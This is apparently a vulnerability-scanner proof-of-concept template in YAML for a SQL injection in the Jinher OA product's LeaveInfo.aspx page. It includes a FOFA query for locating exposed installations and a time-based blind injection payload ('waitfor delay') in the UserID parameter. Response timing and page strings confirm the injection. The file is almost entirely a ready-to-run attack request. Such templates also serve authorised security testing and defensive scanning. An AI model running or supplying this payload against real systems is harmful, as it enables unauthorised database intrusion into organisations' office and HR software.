id: poc-yaml-jinher-jhsoft-leaveinfo-aspx-sqli
info:
  name: 金和OA LeaveInfo.aspx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 金和OA
  fofa: app="金和网络-金和OA"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: GET
  path: /c6/Jhsoft.Web.dossier/LeaveInfo.aspx/?UserID=1')waitfor+delay%270:0:{{.t1}}%27--&gettype=getstation
  expression: 'status_code == 200 &&

    contains(body,"LeaveInfo") &&

    contains(gbk_decode(body),"离职日期") &&

    contains(gbk_decode(body),"离职原因") &&

    duration >= t1 &&

    duration <= t2

    '
transport: http
